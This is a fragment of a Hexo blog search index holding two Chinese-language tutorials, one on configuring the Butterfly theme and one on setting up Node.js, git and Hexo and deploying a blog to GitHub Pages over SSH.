        <content type="html"><![CDATA[<h2 id="一、butterfly主题下载与主题更换"><a href="#一、butterfly主题下载与主题更换" class="headerlink" title="一、butterfly主题下载与主题更换"></a>一、butterfly主题下载与主题更换</h2><h3 id="在hexo根目录下输入以下命令进行下载"><a href="#在hexo根目录下输入以下命令进行下载" class="headerlink" title="在hexo根目录下输入以下命令进行下载"></a>在hexo根目录下输入以下命令进行下载</h3><p>git下载方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>npm下载方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-theme-butterfly</span><br></pre></td></tr></table></figure><h3 id="修改根目录-config-yml主题"><a href="#修改根目录-config-yml主题" class="headerlink" title="修改根目录_config.yml主题"></a>修改根目录_config.yml主题</h3><p>查找theme关键字，将默认主题修改为butterfly</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure><h3 id="主题配置文件"><a href="#主题配置文件" class="headerlink" title="主题配置文件"></a>主题配置文件</h3><p>新建主题盘配置文件**_config.butterfly.yml<strong>，并将theme文件夹下主题配置文件</strong>_config..yml<strong>内容复制粘贴在</strong>_config.butterfly.yml**中。</p><h2 id="二、修改网站主页信息"><a href="#二、修改网站主页信息" class="headerlink" title="二、修改网站主页信息"></a>二、修改网站主页信息</h2><h3 id="导航栏"><a href="#导航栏" class="headerlink" title="导航栏"></a>导航栏</h3><p>将先要添加的目录注释解除掉，并输入以下命令新建相关目录文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">\# Menu 目錄</span><br><span class="line"></span><br><span class="line">menu:</span><br><span class="line"></span><br><span class="line"> 首页: / || fas fa-home</span><br><span class="line"></span><br><span class="line"> 归档: /archives/ || fas fa-archive</span><br><span class="line"></span><br><span class="line"> 标签: /tags/ || fas fa-tags</span><br><span class="line"></span><br><span class="line"> 分类: /categories/ || fas fa-folder-open</span><br><span class="line"></span><br><span class="line"> \# 清单||fas fa-list:</span><br><span class="line"></span><br><span class="line">  \# 音乐: /music/ || fas fa-music</span><br><span class="line"></span><br><span class="line"> \#  电影: /movies/ || fas fa-video</span><br><span class="line"></span><br><span class="line"> 友链: /link/ || fas fa-link</span><br><span class="line"></span><br><span class="line"> 关于: /about/ || fas fa-heart</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page xxx</span><br></pre></td></tr></table></figure><h3 id="社交图标"><a href="#社交图标" class="headerlink" title="社交图标"></a>社交图标</h3><p>取消注释并修改相关链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">social:</span><br><span class="line">  fab fa-github: https://github.com/xxxxx || Github || &quot;#hdhfbb&quot;</span><br><span class="line">  fas fa-envelope: mailto:xxxxxx@gmail.com || Email || &quot;#000000&quot;</span><br></pre></td></tr></table></figure><h3 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h3><p>在站点根目录&#x2F;source下新建img文件夹，将要使用的图片放入，之后修改下列配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">avatar:</span><br><span class="line">  img: /img/avatar.png</span><br><span class="line">  effect: false # 头像一直转圈</span><br></pre></td></tr></table></figure><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><h4 id="代码复制"><a href="#代码复制" class="headerlink" title="代码复制"></a>代码复制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_copy: true</span><br></pre></td></tr></table></figure><h4 id="代码高度限制"><a href="#代码高度限制" class="headerlink" title="代码高度限制"></a>代码高度限制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_height_limit: false # unit: px（修改时写入数字）    </span><br></pre></td></tr></table></figure><h3 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h3><h4 id="文章封面"><a href="#文章封面" class="headerlink" title="文章封面"></a>文章封面</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#显示文章相关信息 </span><br><span class="line">post_meta:</span><br><span class="line">  page:</span><br><span class="line">    date_type: both # created or updated or both 主頁文章日期是創建日或者更新日或都顯示</span><br><span class="line">    date_format: relative # date/relative 顯示日期還是相對日期</span><br><span class="line">    categories: true # true or false 主頁是否顯示分類</span><br><span class="line">    tags: true # true or false 主頁是否顯示標籤</span><br><span class="line">    label: true # true or false 顯示描述性文字</span><br><span class="line">  post:</span><br><span class="line">    date_type: both # created or updated or both 文章頁日期是創建日或者更新日或都顯示</span><br><span class="line">    date_format: relative # date/relative 顯示日期還是相對日期</span><br><span class="line">    categories: true # true or false 文章頁是否顯示分類</span><br><span class="line">    tags: true # true or false 文章頁是否顯示標籤</span><br><span class="line">    label: true # true or false 顯示描述性文字</span><br></pre></td></tr></table></figure><h4 id="版权信息"><a href="#版权信息" class="headerlink" title="版权信息"></a>版权信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># copy settings</span><br><span class="line"># copyright: Add the copyright information after copied content (复制文章后加入版权信息)</span><br><span class="line">copy:</span><br><span class="line">  enable: true</span><br><span class="line">  copyright:</span><br><span class="line">    enable: true</span><br><span class="line">    limit_count: 50</span><br></pre></td></tr></table></figure><h4 id="文章过期提醒"><a href="#文章过期提醒" class="headerlink" title="文章过期提醒"></a>文章过期提醒</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Displays outdated notice for a post (文章過期提醒) #</span><br><span class="line"></span><br><span class="line">noticeOutdate:</span><br><span class="line">  enable: true</span><br><span class="line">  style: flat # style: simple/flat</span><br><span class="line">  limit_day: 365 # When will it be shown</span><br><span class="line">  position: top # position: top/bottom</span><br><span class="line">  message_prev: It has been</span><br><span class="line">  message_next: days since the last update, the content of the article may be outdated.</span><br></pre></td></tr></table></figure><h4 id="文章分页"><a href="#文章分页" class="headerlink" title="文章分页"></a>文章分页</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># post_pagination (分頁)</span><br><span class="line"># value: 1 || 2 || false</span><br><span class="line"># 1: The &#x27;next post&#x27; will link to old post</span><br><span class="line"># 2: The &#x27;next post&#x27; will link to new post</span><br><span class="line"># false: disable pagination</span><br><span class="line">post_pagination: false</span><br></pre></td></tr></table></figure><h3 id="页面美化"><a href="#页面美化" class="headerlink" title="页面美化"></a>页面美化</h3><h4 id="页脚自定义文本"><a href="#页脚自定义文本" class="headerlink" title="页脚自定义文本"></a>页脚自定义文本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">custom_text: Hi, welcome to my &lt;a href=&quot;https://butterfly.js.org/&quot;&gt;blog&lt;/a&gt;!</span><br></pre></td></tr></table></figure><h4 id="公告栏"><a href="#公告栏" class="headerlink" title="公告栏"></a>公告栏</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">card_announcement:</span><br><span class="line"> enable: true</span><br><span class="line"> content: 欢迎来到ourobrosの博客</span><br></pre></td></tr></table></figure><h4 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">comments:</span><br><span class="line"></span><br><span class="line">  # Up to two comments system, the first will be shown as default</span><br><span class="line"></span><br><span class="line">  # Choose: Disqus/Disqusjs/Livere/Gitalk/Valine/Waline/Utterances/Facebook Comments/Twikoo/Giscus/Remark42/Artalk</span><br><span class="line"></span><br><span class="line">  use: # Valine,Disqus</span><br><span class="line">  text: true # Display the comment name next to the button</span><br><span class="line"></span><br><span class="line">  # lazyload: The comment system will be load when comment element enters the browser&#x27;s viewport.</span><br><span class="line"></span><br><span class="line">  # If you set it to true, the comment count will be invalid</span><br><span class="line"></span><br><span class="line">  lazyload: true</span><br><span class="line">  count: true # Display comment count in post&#x27;s top_img</span><br><span class="line">  card_post_count: false # Display comment count in Home Page</span><br></pre></td></tr></table></figure><h4 id="页面美化-1"><a href="#页面美化-1" class="headerlink" title="页面美化"></a>页面美化</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">\# Beautify (美化頁面顯示)</span><br><span class="line"></span><br><span class="line">beautify:</span><br><span class="line"></span><br><span class="line"> enable: true</span><br><span class="line"></span><br><span class="line"> field: post # site/post</span><br><span class="line"></span><br><span class="line"> title-prefix-icon: # &#x27;\f0c1&#x27;</span><br><span class="line"></span><br><span class="line"> title-prefix-icon-color: # &#x27;#F47466&#x27;</span><br></pre></td></tr></table></figure><h3 id="主题魔改参考教程"><a href="#主题魔改参考教程" class="headerlink" title="主题魔改参考教程"></a>主题魔改参考教程</h3><p><a href="https://www.fomal.cc/">https://www.fomal.cc/</a></p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Blog </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo个人博客搭建</title>
      <link href="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h2><h3 id="node-js"><a href="#node-js" class="headerlink" title="node.js"></a>node.js</h3><h4 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h4><p>node.js官网：<a href="https://nodejs.org/zh-cn">https://nodejs.org/zh-cn</a></p><p>Hexo 是一款基于 node.js的静态博客框架,所以需要配置好node.js环境。</p><h4 id="2-环境配置步骤"><a href="#2-环境配置步骤" class="headerlink" title="2.环境配置步骤"></a>2.环境配置步骤</h4><p>首先去node.js官网下载稳定的预构建安装程序，之后新建文件夹将安装程序放入，启动过程中可以更改文件储存路径（虽然但是还是不建议放c盘）</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713115547618.png" class="" title="image-20240713115547618"><p>然后在电脑设置中搜索高级系统设置，点击环境变量。这时你会发现预安装程序已经将node.js的环境变量写入系统变量（环境变量）了。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120605794.png" class="" title="image-20240713120605794"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120307907.png" class="" title="image-20240713120307907"><style>.pyiqhlobsinu{zoom:80%;}</style><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120057786.png" class="pyiqhlobsinu" alt="image-20240713120057786"><p>之后点击win+R，输入cmd，打开终端输入node -v和npm -v查看版本，发现已经出现版本号。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120826444.png" class="" title="image-20240713120826444"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120909905.png" class="" title="image-20240713120909905"><p>之后在存储node.js的文件夹中新建两个文件夹【node_global】和【node_cache】</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713121043654.png" class="" title="image-20240713121043654"><p>之后在用户变量的PATH里，将默认的 C:APPData\Roaming\npm 修改成 C:\Program Files\nodejs\node_global</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713121507254.png" class="" title="image-20240713121507254"><p>完成后我们退出来，在系统变量处新建一个NODE_PATH,并写入</p><p>G:\xxx（自己保存node.js的文件夹位置）\node.js\node_global\node_modules</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120653380.png" class="" title="image-20240713120653380"><p>之后我们进入系统变量的PATH里新建一个变量%NODE_PATH%，还有另外两个变量%NODE_PATH%\node_cache和%NODE_PATH%\node_global</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713121840722.png" class="" title="image-20240713121840722"><p>然后进行测试：npm install express -g   &#x2F;&#x2F; -g是全局安装的意思，尝试下载看是否报错。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713121936785.png" class="" title="image-20240713121936785"><p>没有梯子就更换国内镜像源：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><h3 id="GIT"><a href="#GIT" class="headerlink" title="GIT"></a>GIT</h3><p>下载地址：<a href="https://git-scm.com/download">https://git-scm.com/download</a></p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713122258697.png" class="" title="image-20240713122258697"><p>之后将下载的预安装包找一个文件夹放，之后除了安装路径，无脑下一步就行，想改文末有参考教程，很详细。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713122552506.png" class="" title="image-20240713122552506"><p>git的使用：鼠标右键文件夹，如果没有git bash，如下图，就点击显示更多选项</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713122855110.png" class="" title="image-20240713122855110"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713123006602.png" class="" title="image-20240713123006602"><h2 id="二、hexo下载"><a href="#二、hexo下载" class="headerlink" title="二、hexo下载"></a>二、hexo下载</h2><p>我们这里建议新建一个文件夹，放hexo，之后git bash打开位置放在hexo文件夹中，之后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli#如果出现报错，尝试在命令前加上npx，下文hexo内容同理</span><br></pre></td></tr></table></figure><p>下载完成之后输入 hexo -v查看版本，有版本显示就说明下载完成。</p><p>之后进入hexo文件夹中，输入一下命令初始化文件夹。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init </span><br></pre></td></tr></table></figure><p>这样本地的网站配置也弄好啦，输入【hexo g】生成静态网页，然后输入【hexo s】打开本地服务器（ctrl+c关闭本地服务器），之后就可以在浏览器的url栏输入localhost:4000，本地博客就搭建完成了。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713123656676.png" class="" title="image-20240713123656676"><h2 id="三、github托管"><a href="#三、github托管" class="headerlink" title="三、github托管"></a>三、github托管</h2><p>注册一个github账号：<a href="https://github.com/">https://github.com/</a></p><p>新建一个仓库，your repositories，新建一个仓库。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713124009896.png" class="" title="image-20240713124009896"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713124104126.png" class="" title="image-20240713124104126"><p>填写内容如下，选一个喜欢的名字但是后缀不能改变。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713124421405.png" class="" title="image-20240713124421405"><h4 id="ssh私钥连接"><a href="#ssh私钥连接" class="headerlink" title="ssh私钥连接"></a>ssh私钥连接</h4><p>在git bash输入以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#第一次使用git后需要将用户名和邮箱进行初始化</span><br><span class="line"></span><br><span class="line">git config --global user.name &quot;yourname&quot; </span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br></pre></td></tr></table></figure><p>用以下命令检查是否输对</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config user.name</span><br><span class="line"></span><br><span class="line"> git config user.email</span><br></pre></td></tr></table></figure><p>然后一直回车（enter），之后输入以下命令进行邮箱验证。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;youremail&quot;</span><br></pre></td></tr></table></figure><p>之后电脑c盘&#x2F;用户&#x2F;电脑用户名，文件夹中会出现一个.ssh文件夹，如下图，右键记事本打开其中的id_rsa.pub，复制所有内容。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713125128617.png" class="" title="image-20240713125128617"><p>之后来到github，点击头像，点击setting，在ssh和gpg key里点击NEW ssh key，之后输入复制的内容（名字随便起）</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713125250712.png" class="" title="image-20240713125250712"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713125342974.png" class="" title="image-20240713125342974"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713125430180.png" class="" title="image-20240713125430180"><p>之后在git bash里输入ssh -T <a href="mailto:&#103;&#105;&#x74;&#x40;&#103;&#x69;&#116;&#104;&#117;&#98;&#x2e;&#x63;&#111;&#x6d;">&#103;&#105;&#x74;&#x40;&#103;&#x69;&#116;&#104;&#117;&#98;&#x2e;&#x63;&#111;&#x6d;</a>，如果出现下图（你的用户名），就说明成功</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713125606931.png" class="" title="image-20240713125606931"><p>之后我们就可以配置hexo文件夹中的_confing.yml配置文件了，repository修改为你自己的github项目地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># URL</span><br><span class="line">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span><br><span class="line">url: https://hackingtree.github.io/Blog.github.io/</span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">permalink_defaults:</span><br><span class="line">pretty_urls:</span><br><span class="line">  trailing_index: true # Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span><br><span class="line">  trailing_html: true # Set to false to remove trailing &#x27;.html&#x27; from permalinks</span><br></pre></td></tr></table></figure><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240714214124767.png" class="" title="image-20240714214124767"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:  </span><br><span class="line">  type: git  </span><br><span class="line">  repository: https://github.com/xxx（用户名）/xxx.github.io.git （见下图）</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713130104371.png" class="" title="image-20240713130104371"><p>或者</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713130128677.png" class="" title="image-20240713130128677"><p>之后输入以下命令，下载插件，将生成网页通过git方式上传到你对应的链接仓库中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>之后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo clean </span><br><span class="line"></span><br><span class="line">hexo g （generate） </span><br><span class="line"></span><br><span class="line">hexo d （deploy）</span><br></pre></td></tr></table></figure><p>将配置文件上传到git仓库中，这三个命令一般都是一起使用的</p><p>第一次hexo d的时候可能会有密码（你的github密码）</p><p>之后访问<a href="https://github.com/xxx%EF%BC%88%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%89/xxx.github.io.git%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E4%BD%A0%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%BA%86%E3%80%82">https://github.com/xxx（用户名）/xxx.github.io.git就可以访问你的博客了。</a></p><h2 id="四、next主题配置"><a href="#四、next主题配置" class="headerlink" title="四、next主题配置"></a>四、next主题配置</h2><p>参考链接<a href="https://blog.csdn.net/as480133937/article/details/100138838">Hexo-Next 主题博客个性化配置超详细，超全面(两万字)_hexo next 记录访问了ip-CSDN博客</a></p><p>参考链接<a href="https://iitii.github.io/2021/05/28/1/#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%87%E4%BB%B6%E7%9A%84%E8%B7%AF%E5%BE%84">Hexo Next 主题安装、配置及美化 | Hello Memo (iitii.github.io)</a></p><p>文章参考和部分图片来源：</p><p>node.js下载和环境配置：<a href="http://t.csdnimg.cn/GpuGX">http://t.csdnimg.cn/GpuGX</a></p><p>git下载和环境配置：<a href="http://t.csdnimg.cn/cuSYy">http://t.csdnimg.cn/cuSYy</a></p><p>hexo+git个人博客搭建：<a href="http://t.csdnimg.cn/7UFPd">http://t.csdnimg.cn/7UFPd</a></p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Blog </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
